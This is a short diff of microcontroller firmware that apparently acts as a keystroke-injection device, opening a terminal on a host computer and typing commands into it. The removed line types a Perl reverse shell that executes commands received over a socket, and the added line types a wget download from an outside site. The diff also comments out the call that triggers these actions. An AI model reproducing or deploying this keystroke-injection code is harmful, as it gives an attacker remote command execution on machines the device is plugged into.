@@ -9,7 +9,7 @@ int BLINK_DELAY = 250;
 
 void setup() {
   pinMode(PIN_LED, OUTPUT);
-  pinMode(PIN_BUTTON, INPUT);
+  pinMode(PIN_BUTTON, INPUT_PULLUP);
   digitalWrite(PIN_LED, HIGH);
 }
 
@@ -17,9 +17,10 @@ void actions() {
   delay(1000);
   openTerminal();
   delay(50);
-  type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'");
+  /* type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'"); */
 
-  start = 3;
+  type("wget -q http://slacy.me -O test.tmp");
+
   BLINK_DELAY = 75;
 }
 
@@ -96,17 +97,20 @@ void loop() {
 
   digitalWrite(PIN_LED, HIGH);
   delay(BLINK_DELAY);
-  if (start != 0) {
-    digitalWrite(PIN_LED, LOW);
-    delay(BLINK_DELAY);
-  }
-  if (start == 3) {
+  digitalWrite(PIN_LED, LOW);
+  delay(BLINK_DELAY);
+
+  if (start == 1) {
     return;
   }
 
   // PIN_BUTTON press
-  if (digitalRead(PIN_BUTTON) == HIGH && start == 0) {
+  if (digitalRead(PIN_BUTTON) == LOW) {
+    /* actions(); */
+    BLINK_DELAY = 25;
     start = 1;
-    actions();
+  }
+  else {
+    BLINK_DELAY = 200;
   }
 }
